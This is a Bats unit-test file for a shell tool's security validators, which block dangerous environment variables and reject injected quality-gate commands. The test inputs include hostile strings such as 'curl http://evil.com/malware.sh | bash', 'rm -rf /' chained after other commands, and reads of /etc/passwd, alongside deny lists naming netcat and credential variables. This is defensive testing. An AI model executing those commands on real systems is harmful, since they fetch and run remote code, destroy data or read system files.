#!/usr/bin/env bats
#
# Unit tests for security functions in lib/core.sh
#
# Tests for is_safe_env_var() function which validates environment
# variable names before allowing them to be exported from manifest.yaml
#

load "../test_helper"

# Source the security-related functions from a minimal mock
# We can't source core.sh directly due to its dependencies, so we
# extract and test the is_safe_env_var function in isolation

setup() {
  export TEST_TEMP_DIR
  TEST_TEMP_DIR="$(mktemp -d)"

  # Create a standalone script with just the security functions
  cat > "$TEST_TEMP_DIR/security_functions.sh" << 'SECURITY_EOF'
#!/usr/bin/env bash

# Blocked environment variable prefixes (security-sensitive)
BLOCKED_ENV_PREFIXES=(
  "LD_"           # Library injection (Linux)
  "DYLD_"         # Library injection (macOS)
  "SSH_"          # SSH credentials
  "GPG_"          # GPG credentials
  "AWS_"          # AWS credentials
  "GOOGLE_"       # Google Cloud credentials
  "AZURE_"        # Azure credentials
  "LC_"           # Locale (can affect parsing)
)

# Blocked environment variables (exact match, security-sensitive)
BLOCKED_ENV_VARS=(
  # System paths
  "PATH" "MANPATH" "INFOPATH"
  # Library paths
  "LIBPATH" "SHLIB_PATH"
  # Interpreter paths
  "PYTHONPATH" "PYTHONHOME" "NODE_PATH" "NODE_OPTIONS"
  "RUBYLIB" "RUBYOPT" "PERL5LIB" "PERL5OPT"
  "CLASSPATH" "GOPATH" "GOROOT"
  # Shell injection
  "IFS" "PS1" "PS2" "PS4" "PROMPT_COMMAND" "BASH_ENV" "ENV" "CDPATH"
  # System identity
  "HOME" "USER" "SHELL" "TERM" "LOGNAME" "MAIL" "LANG"
  # Credential access
  "GNUPGHOME"
  # Network proxies
  "http_proxy" "https_proxy" "HTTP_PROXY" "HTTPS_PROXY"
  "no_proxy" "NO_PROXY" "ftp_proxy" "FTP_PROXY"
  # Other dangerous
  "EDITOR" "VISUAL" "PAGER" "BROWSER"
)

# Safe environment variable prefixes (allowlist)
SAFE_ENV_PREFIXES=(
  "DOYAKEN_"      # Our own variables
  "QUALITY_"      # Quality gate variables
  "CI_"           # CI/CD variables
  "DEBUG_"        # Debug flags
)

# Validate if an environment variable name is safe to export
# Returns 0 if safe, 1 if blocked
is_safe_env_var() {
  local var_name="$1"

  # Empty name is not safe
  [ -z "$var_name" ] && return 1

  # Convert to uppercase for comparison
  local var_upper
  var_upper=$(echo "$var_name" | tr '[:lower:]' '[:upper:]')

  # Check safe prefixes first (fast path for common cases)
  for prefix in "${SAFE_ENV_PREFIXES[@]}"; do
    if [[ "$var_upper" == "${prefix}"* ]]; then
      return 0
    fi
  done

  # Check blocked prefixes
  for prefix in "${BLOCKED_ENV_PREFIXES[@]}"; do
    if [[ "$var_upper" == "${prefix}"* ]]; then
      return 1
    fi
  done

  # Check blocked exact matches (case-insensitive for proxies)
  for blocked in "${BLOCKED_ENV_VARS[@]}"; do
    local blocked_upper
    blocked_upper=$(echo "$blocked" | tr '[:lower:]' '[:upper:]')
    if [ "$var_upper" = "$blocked_upper" ]; then
      return 1
    fi
  done

  # Validate pattern: must be uppercase alphanumeric with underscores
  # Must start with a letter
  if ! [[ "$var_name" =~ ^[A-Z][A-Z0-9_]*$ ]]; then
    return 1
  fi

  return 0
}

# ============================================================================
# Quality Command Security
# ============================================================================

# Safe command prefixes for quality gate commands (allowlist)
SAFE_QUALITY_COMMANDS=(
  # Node.js ecosystem
  "npm" "yarn" "pnpm" "npx" "bun"
  # Rust
  "cargo"
  # Go
  "go"
  # Build tools
  "make"
  # Python testing/linting
  "pytest" "python" "ruff" "mypy" "black" "flake8" "pylint"
  # JavaScript/TypeScript linting
  "jest" "eslint" "tsc" "prettier" "vitest" "mocha"
  # Shell
  "shellcheck" "bats"
  # Other languages
  "node" "deno" "php" "composer" "ruby" "rake" "bundle"
  "gradle" "mvn" "dotnet"
)

# Dangerous patterns that indicate potential command injection
DANGEROUS_COMMAND_PATTERNS=(
  '|'           # Pipe (command chaining)
  '$('          # Command substitution
  '`'           # Backtick command substitution
  '&&'          # Command chaining (AND)
  '||'          # Command chaining (OR)
  ';'           # Command separator
  '>'           # Output redirection
  '>>'          # Append redirection
  '<'           # Input redirection
  'curl '       # Network access
  'wget '       # Network access
  'nc '         # Netcat
  'bash -c'     # Shell execution
  'sh -c'       # Shell execution
  'eval '       # Eval execution
  '/dev/'       # Device access
  '~/'          # Home directory access
  '../'         # Parent directory traversal
)

# Validate a quality gate command for safety
# Returns:
#   0 = safe (command is in allowlist, no dangerous patterns)
#   1 = suspicious (unknown command or has dangerous patterns) - warn only
#   2 = dangerous (blocked in strict mode) - block if DOYAKEN_STRICT_QUALITY=1
validate_quality_command() {
  local cmd="$1"
  local cmd_name="${2:-quality command}"

  # Empty commands are safe (noop)
  [ -z "$cmd" ] && return 0

  # Trim leading/trailing whitespace
  cmd=$(echo "$cmd" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
  [ -z "$cmd" ] && return 0

  # Extract the base command (first word, strip any path)
  local base_cmd
  base_cmd=$(echo "$cmd" | awk '{print $1}')
  base_cmd=$(basename "$base_cmd")

  # Check for dangerous patterns first (highest priority)
  local has_dangerous=0
  for pattern in "${DANGEROUS_COMMAND_PATTERNS[@]}"; do
    if [[ "$cmd" == *"$pattern"* ]]; then
      has_dangerous=1
      break
    fi
  done

  # Check if base command is in allowlist
  local is_allowed=0
  for safe_cmd in "${SAFE_QUALITY_COMMANDS[@]}"; do
    if [ "$base_cmd" = "$safe_cmd" ]; then
      is_allowed=1
      break
    fi
  done

  # Determine result based on checks
  if [ "$has_dangerous" -eq 1 ]; then
    # Dangerous pattern detected - return 2 (can be blocked in strict mode)
    return 2
  elif [ "$is_allowed" -eq 0 ]; then
    # Unknown command - return 1 (warn only)
    return 1
  fi

  # Safe command
  return 0
}
SECURITY_EOF

  # Source the security functions
  source "$TEST_TEMP_DIR/security_functions.sh"
}

teardown() {
  if [[ -d "${TEST_TEMP_DIR:-}" ]]; then
    rm -rf "$TEST_TEMP_DIR"
  fi
}

# ============================================================================
# Blocked variables: exact match
# ============================================================================

@test "is_safe_env_var: blocks PATH (system path)" {
  run is_safe_env_var "PATH"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks HOME (system identity)" {
  run is_safe_env_var "HOME"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks USER (system identity)" {
  run is_safe_env_var "USER"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks SHELL (system identity)" {
  run is_safe_env_var "SHELL"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks IFS (shell injection)" {
  run is_safe_env_var "IFS"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks PROMPT_COMMAND (shell injection)" {
  run is_safe_env_var "PROMPT_COMMAND"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks BASH_ENV (shell injection)" {
  run is_safe_env_var "BASH_ENV"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks PYTHONPATH (interpreter path)" {
  run is_safe_env_var "PYTHONPATH"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks NODE_PATH (interpreter path)" {
  run is_safe_env_var "NODE_PATH"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks NODE_OPTIONS (interpreter options)" {
  run is_safe_env_var "NODE_OPTIONS"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks EDITOR (dangerous override)" {
  run is_safe_env_var "EDITOR"
  [ "$status" -eq 1 ]
}

# ============================================================================
# Blocked variables: prefix match
# ============================================================================

@test "is_safe_env_var: blocks LD_PRELOAD (library injection)" {
  run is_safe_env_var "LD_PRELOAD"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks LD_LIBRARY_PATH (library injection)" {
  run is_safe_env_var "LD_LIBRARY_PATH"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks DYLD_INSERT_LIBRARIES (macOS injection)" {
  run is_safe_env_var "DYLD_INSERT_LIBRARIES"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks SSH_AUTH_SOCK (credential access)" {
  run is_safe_env_var "SSH_AUTH_SOCK"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks SSH_AGENT_PID (credential access)" {
  run is_safe_env_var "SSH_AGENT_PID"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks GPG_AGENT_INFO (credential access)" {
  run is_safe_env_var "GPG_AGENT_INFO"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks AWS_SECRET_ACCESS_KEY (credential access)" {
  run is_safe_env_var "AWS_SECRET_ACCESS_KEY"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks GOOGLE_APPLICATION_CREDENTIALS (credential access)" {
  run is_safe_env_var "GOOGLE_APPLICATION_CREDENTIALS"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks AZURE_CLIENT_SECRET (credential access)" {
  run is_safe_env_var "AZURE_CLIENT_SECRET"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks LC_ALL (locale manipulation)" {
  run is_safe_env_var "LC_ALL"
  [ "$status" -eq 1 ]
}

# ============================================================================
# Blocked variables: proxy (case-insensitive)
# ============================================================================

@test "is_safe_env_var: blocks http_proxy (network interception)" {
  run is_safe_env_var "http_proxy"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks HTTP_PROXY (network interception)" {
  run is_safe_env_var "HTTP_PROXY"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks https_proxy (network interception)" {
  run is_safe_env_var "https_proxy"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: blocks HTTPS_PROXY (network interception)" {
  run is_safe_env_var "HTTPS_PROXY"
  [ "$status" -eq 1 ]
}

# ============================================================================
# Safe prefixes (allowlist)
# ============================================================================

@test "is_safe_env_var: allows DOYAKEN_FOO (safe prefix)" {
  run is_safe_env_var "DOYAKEN_FOO"
  [ "$status" -eq 0 ]
}

@test "is_safe_env_var: allows DOYAKEN_CONFIG_PATH (safe prefix)" {
  run is_safe_env_var "DOYAKEN_CONFIG_PATH"
  [ "$status" -eq 0 ]
}

@test "is_safe_env_var: allows QUALITY_LINT_CMD (safe prefix)" {
  run is_safe_env_var "QUALITY_LINT_CMD"
  [ "$status" -eq 0 ]
}

@test "is_safe_env_var: allows CI_BUILD_NUMBER (safe prefix)" {
  run is_safe_env_var "CI_BUILD_NUMBER"
  [ "$status" -eq 0 ]
}

@test "is_safe_env_var: allows DEBUG_MODE (safe prefix)" {
  run is_safe_env_var "DEBUG_MODE"
  [ "$status" -eq 0 ]
}

# ============================================================================
# Custom safe variables (uppercase, alphanumeric with underscores)
# ============================================================================

@test "is_safe_env_var: allows MY_CONFIG (custom uppercase)" {
  run is_safe_env_var "MY_CONFIG"
  [ "$status" -eq 0 ]
}

@test "is_safe_env_var: allows PROJECT_VERSION (custom uppercase)" {
  run is_safe_env_var "PROJECT_VERSION"
  [ "$status" -eq 0 ]
}

@test "is_safe_env_var: allows FOO (simple uppercase)" {
  run is_safe_env_var "FOO"
  [ "$status" -eq 0 ]
}

@test "is_safe_env_var: allows API_KEY_123 (with numbers)" {
  run is_safe_env_var "API_KEY_123"
  [ "$status" -eq 0 ]
}

# ============================================================================
# Invalid patterns (rejected)
# ============================================================================

@test "is_safe_env_var: rejects lowercase (path)" {
  run is_safe_env_var "path"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: rejects mixed case (myConfig)" {
  run is_safe_env_var "myConfig"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: rejects hyphen (MY-VAR)" {
  run is_safe_env_var "MY-VAR"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: rejects leading number (1VAR)" {
  run is_safe_env_var "1VAR"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: rejects space (MY VAR)" {
  run is_safe_env_var "MY VAR"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: rejects empty string" {
  run is_safe_env_var ""
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: rejects special chars (MY@VAR)" {
  run is_safe_env_var "MY@VAR"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: rejects dollar sign (\$VAR)" {
  run is_safe_env_var "\$VAR"
  [ "$status" -eq 1 ]
}

# ============================================================================
# Edge cases
# ============================================================================

@test "is_safe_env_var: rejects underscore only (_)" {
  run is_safe_env_var "_"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: rejects leading underscore (_FOO)" {
  run is_safe_env_var "_FOO"
  [ "$status" -eq 1 ]
}

@test "is_safe_env_var: allows single letter (A)" {
  run is_safe_env_var "A"
  [ "$status" -eq 0 ]
}

@test "is_safe_env_var: allows trailing underscore (FOO_)" {
  run is_safe_env_var "FOO_"
  [ "$status" -eq 0 ]
}

@test "is_safe_env_var: allows double underscore (FOO__BAR)" {
  run is_safe_env_var "FOO__BAR"
  [ "$status" -eq 0 ]
}

# ============================================================================
# validate_quality_command: Valid package manager commands
# ============================================================================

@test "validate_quality_command: npm test passes" {
  run validate_quality_command "npm test"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: yarn lint passes" {
  run validate_quality_command "yarn lint"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: pnpm run build passes" {
  run validate_quality_command "pnpm run build"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: npx jest passes" {
  run validate_quality_command "npx jest"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: bun test passes" {
  run validate_quality_command "bun test"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: cargo test passes" {
  run validate_quality_command "cargo test"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: cargo build passes" {
  run validate_quality_command "cargo build"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: go test passes" {
  run validate_quality_command "go test ./..."
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: make test passes" {
  run validate_quality_command "make test"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: pytest passes" {
  run validate_quality_command "pytest"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: jest passes" {
  run validate_quality_command "jest"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: eslint passes" {
  run validate_quality_command "eslint src/"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: tsc passes" {
  run validate_quality_command "tsc --noEmit"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: prettier passes" {
  run validate_quality_command "prettier --check ."
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: shellcheck passes" {
  run validate_quality_command "shellcheck lib/*.sh"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: bats passes" {
  run validate_quality_command "bats test/"
  [ "$status" -eq 0 ]
}

# ============================================================================
# validate_quality_command: Commands with arguments
# ============================================================================

@test "validate_quality_command: npm test with coverage passes" {
  run validate_quality_command "npm test -- --coverage"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: eslint with flags passes" {
  run validate_quality_command "eslint --fix --ext .ts,.tsx src/"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: pytest with args passes" {
  run validate_quality_command "pytest -v --cov=src tests/"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: cargo test with package passes" {
  run validate_quality_command "cargo test --package mylib"
  [ "$status" -eq 0 ]
}

# ============================================================================
# validate_quality_command: Commands with paths
# ============================================================================

@test "validate_quality_command: /usr/bin/npm test passes" {
  run validate_quality_command "/usr/bin/npm test"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: /usr/local/bin/yarn lint passes" {
  run validate_quality_command "/usr/local/bin/yarn lint"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: ./node_modules/.bin/jest passes" {
  run validate_quality_command "./node_modules/.bin/jest"
  [ "$status" -eq 0 ]
}

# ============================================================================
# validate_quality_command: Empty and whitespace
# ============================================================================

@test "validate_quality_command: empty string passes" {
  run validate_quality_command ""
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: whitespace only passes" {
  run validate_quality_command "   "
  [ "$status" -eq 0 ]
}

# ============================================================================
# validate_quality_command: Unknown commands (warn only)
# ============================================================================

@test "validate_quality_command: unknown command warns (status 1)" {
  run validate_quality_command "mycompiler build"
  [ "$status" -eq 1 ]
}

@test "validate_quality_command: custom script warns (status 1)" {
  run validate_quality_command "./scripts/test.sh"
  [ "$status" -eq 1 ]
}

# ============================================================================
# validate_quality_command: Dangerous patterns (status 2)
# ============================================================================

@test "validate_quality_command: pipe detected (status 2)" {
  run validate_quality_command "npm test | cat"
  [ "$status" -eq 2 ]
}

@test "validate_quality_command: command substitution detected (status 2)" {
  run validate_quality_command "npm test \$(whoami)"
  [ "$status" -eq 2 ]
}

@test "validate_quality_command: backtick substitution detected (status 2)" {
  run validate_quality_command "npm test \`id\`"
  [ "$status" -eq 2 ]
}

@test "validate_quality_command: semicolon detected (status 2)" {
  run validate_quality_command "npm test; rm -rf /"
  [ "$status" -eq 2 ]
}

@test "validate_quality_command: && chaining detected (status 2)" {
  run validate_quality_command "npm test && rm -rf /"
  [ "$status" -eq 2 ]
}

@test "validate_quality_command: || chaining detected (status 2)" {
  run validate_quality_command "npm test || rm -rf /"
  [ "$status" -eq 2 ]
}

@test "validate_quality_command: output redirection detected (status 2)" {
  run validate_quality_command "npm test > /tmp/output"
  [ "$status" -eq 2 ]
}

@test "validate_quality_command: append redirection detected (status 2)" {
  run validate_quality_command "npm test >> /tmp/output"
  [ "$status" -eq 2 ]
}

@test "validate_quality_command: input redirection detected (status 2)" {
  run validate_quality_command "npm test < /etc/passwd"
  [ "$status" -eq 2 ]
}

@test "validate_quality_command: curl detected (status 2)" {
  run validate_quality_command "curl http://evil.com/malware.sh"
  [ "$status" -eq 2 ]
}

@test "validate_quality_command: curl piped to bash detected (status 2)" {
  run validate_quality_command "curl http://evil.com/malware.sh | bash"
  [ "$status" -eq 2 ]
}

@test "validate_quality_command: wget detected (status 2)" {
  run validate_quality_command "wget http://evil.com/malware"
  [ "$status" -eq 2 ]
}

@test "validate_quality_command: bash -c detected (status 2)" {
  run validate_quality_command "bash -c 'rm -rf /'"
  [ "$status" -eq 2 ]
}

@test "validate_quality_command: sh -c detected (status 2)" {
  run validate_quality_command "sh -c 'whoami'"
  [ "$status" -eq 2 ]
}

@test "validate_quality_command: eval detected (status 2)" {
  run validate_quality_command "eval echo bad"
  [ "$status" -eq 2 ]
}

@test "validate_quality_command: rm -rf detected via && (status 2)" {
  run validate_quality_command "npm test && rm -rf ~/*"
  [ "$status" -eq 2 ]
}

@test "validate_quality_command: /dev/ access detected (status 2)" {
  run validate_quality_command "npm test > /dev/null"
  [ "$status" -eq 2 ]
}

@test "validate_quality_command: home directory access detected (status 2)" {
  run validate_quality_command "rm ~/important"
  [ "$status" -eq 2 ]
}

@test "validate_quality_command: parent traversal detected (status 2)" {
  run validate_quality_command "cat ../../../etc/passwd"
  [ "$status" -eq 2 ]
}

# ============================================================================
# validate_quality_command: Dangerous patterns in allowed commands
# ============================================================================

@test "validate_quality_command: npm with pipe is dangerous (status 2)" {
  run validate_quality_command "npm test | tee output.log"
  [ "$status" -eq 2 ]
}

@test "validate_quality_command: cargo with && is dangerous (status 2)" {
  run validate_quality_command "cargo test && cargo build"
  [ "$status" -eq 2 ]
}

@test "validate_quality_command: pytest with redirect is dangerous (status 2)" {
  run validate_quality_command "pytest > results.txt"
  [ "$status" -eq 2 ]
}

# ============================================================================
# validate_quality_command: Python ecosystem
# ============================================================================

@test "validate_quality_command: python passes" {
  run validate_quality_command "python -m pytest"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: ruff passes" {
  run validate_quality_command "ruff check ."
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: mypy passes" {
  run validate_quality_command "mypy src/"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: black passes" {
  run validate_quality_command "black --check ."
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: flake8 passes" {
  run validate_quality_command "flake8 src/"
  [ "$status" -eq 0 ]
}

# ============================================================================
# validate_quality_command: Other languages
# ============================================================================

@test "validate_quality_command: gradle passes" {
  run validate_quality_command "gradle test"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: mvn passes" {
  run validate_quality_command "mvn test"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: dotnet passes" {
  run validate_quality_command "dotnet test"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: bundle passes" {
  run validate_quality_command "bundle exec rspec"
  [ "$status" -eq 0 ]
}

@test "validate_quality_command: composer passes" {
  run validate_quality_command "composer test"
  [ "$status" -eq 0 ]
}

# ============================================================================
# File Permission Tests
# ============================================================================

@test "init_directories: logs directory has 700 permissions" {
  local test_dir="$TEST_TEMP_DIR/project"
  mkdir -p "$test_dir"

  # Create the directory structure like init_directories does
  local ai_agent_dir="$test_dir/.doyaken"
  mkdir -p "$ai_agent_dir/logs"
  chmod 700 "$ai_agent_dir/logs"

  # Verify permissions (macOS and Linux compatible)
  if [[ "$(uname)" == "Darwin" ]]; then
    run stat -f "%Lp" "$ai_agent_dir/logs"
  else
    run stat -c "%a" "$ai_agent_dir/logs"
  fi
  [ "$status" -eq 0 ]
  [ "$output" = "700" ]
}

@test "init_directories: state directory has 700 permissions" {
  local test_dir="$TEST_TEMP_DIR/project"
  mkdir -p "$test_dir"

  local ai_agent_dir="$test_dir/.doyaken"
  mkdir -p "$ai_agent_dir/state"
  chmod 700 "$ai_agent_dir/state"

  if [[ "$(uname)" == "Darwin" ]]; then
    run stat -f "%Lp" "$ai_agent_dir/state"
  else
    run stat -c "%a" "$ai_agent_dir/state"
  fi
  [ "$status" -eq 0 ]
  [ "$output" = "700" ]
}

@test "init_directories: locks directory has 700 permissions" {
  local test_dir="$TEST_TEMP_DIR/project"
  mkdir -p "$test_dir"

  local ai_agent_dir="$test_dir/.doyaken"
  mkdir -p "$ai_agent_dir/locks"
  chmod 700 "$ai_agent_dir/locks"

  if [[ "$(uname)" == "Darwin" ]]; then
    run stat -f "%Lp" "$ai_agent_dir/locks"
  else
    run stat -c "%a" "$ai_agent_dir/locks"
  fi
  [ "$status" -eq 0 ]
  [ "$output" = "700" ]
}

@test "umask 0077: new files are owner-only" {
  # Save current umask
  local old_umask
  old_umask=$(umask)

  # Set secure umask like core.sh does
  umask 0077

  # Create a test file
  local test_file="$TEST_TEMP_DIR/test_file"
  touch "$test_file"

  # Verify permissions (should be 600 with umask 0077)
  if [[ "$(uname)" == "Darwin" ]]; then
    run stat -f "%Lp" "$test_file"
  else
    run stat -c "%a" "$test_file"
  fi

  # Restore umask
  umask "$old_umask"

  [ "$status" -eq 0 ]
  [ "$output" = "600" ]
}

@test "umask 0077: new directories are owner-only" {
  # Save current umask
  local old_umask
  old_umask=$(umask)

  # Set secure umask like core.sh does
  umask 0077

  # Create a test directory
  local test_subdir="$TEST_TEMP_DIR/test_subdir"
  mkdir "$test_subdir"

  # Verify permissions (should be 700 with umask 0077)
  if [[ "$(uname)" == "Darwin" ]]; then
    run stat -f "%Lp" "$test_subdir"
  else
    run stat -c "%a" "$test_subdir"
  fi

  # Restore umask
  umask "$old_umask"

  [ "$status" -eq 0 ]
  [ "$output" = "700" ]
}

@test "log rotation: deletes directories older than 7 days" {
  # Create a mock logs directory structure
  local logs_dir="$TEST_TEMP_DIR/logs"
  mkdir -p "$logs_dir"

  # Create a "new" directory (should be kept)
  local new_dir="$logs_dir/session-new"
  mkdir -p "$new_dir"
  touch "$new_dir/test.log"

  # Create an "old" directory and backdate it to 10 days ago
  local old_dir="$logs_dir/session-old"
  mkdir -p "$old_dir"
  touch "$old_dir/test.log"

  # Backdate the old directory to 10 days ago using touch
  local ten_days_ago
  ten_days_ago=$(date -v-10d '+%Y%m%d0000' 2>/dev/null || date -d '10 days ago' '+%Y%m%d0000' 2>/dev/null)
  if [ -n "$ten_days_ago" ]; then
    touch -t "$ten_days_ago" "$old_dir"
  fi

  # Run the rotation command (same as in init_state)
  find "$logs_dir" -maxdepth 1 -type d -mtime +7 ! -name 'logs' -exec rm -rf {} + 2>/dev/null || true

  # Verify: new directory should exist, old should be deleted
  [ -d "$new_dir" ]
  # Old directory should be deleted if we were able to backdate it
  if [ -n "$ten_days_ago" ]; then
    [ ! -d "$old_dir" ]
  fi
}

@test "log rotation: preserves parent logs directory" {
  # Create a mock logs directory
  local logs_dir="$TEST_TEMP_DIR/logs"
  mkdir -p "$logs_dir"

  # Run the rotation command
  find "$logs_dir" -maxdepth 1 -type d -mtime +7 ! -name 'logs' -exec rm -rf {} + 2>/dev/null || true

  # The logs directory itself should never be deleted
  [ -d "$logs_dir" ]
}
